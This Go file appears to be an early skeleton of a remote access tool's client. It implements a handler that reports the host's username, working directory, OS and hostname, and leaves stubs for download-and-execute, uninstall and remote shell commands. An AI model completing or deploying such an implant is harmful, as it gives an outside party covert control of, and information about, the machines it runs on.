package rpc

import (
	"../proto"
	"context"
	"github.com/matishsiao/goInfo"
	"os"
	user2 "os/user"
)

type Server struct {}

func (s Server) GetClientInfo(ctx context.Context, req *proto.GetClientInfoRequest) (*proto.GetClientInfoReply, error) {
	dir, err := os.Getwd()
	if err != nil {
		return nil, err
	}
	user, err := user2.Current()
	if err != nil {
		return nil, err
	}
	return &proto.GetClientInfoReply{
		Tag:      "testTag",
		Path:     dir,
		Version:  "0.0.1",
		Username: user.Username,
		Admin:    false,	// Todo
		Os:       goInfo.GetInfo().OS + " " + goInfo.GetInfo().Core,
		Hostname: goInfo.GetInfo().Hostname,
	}, nil
}

func (s Server) DownloadAndExecute(ctx context.Context, req *proto.DownloadAndExecuteRequest) (*proto.DownloadAndExecuteReply, error) {
	panic("implement me")
}

func (s Server) Uninstall(ctx context.Context, req *proto.UninstallRequest) (*proto.UninstallReply, error) {
	panic("implement me")
}

func (s Server) RunShellCommand(ctx context.Context, req *proto.RunShellCommandRequest) (*proto.RunShellCommandReply, error) {
	panic("implement me")
}




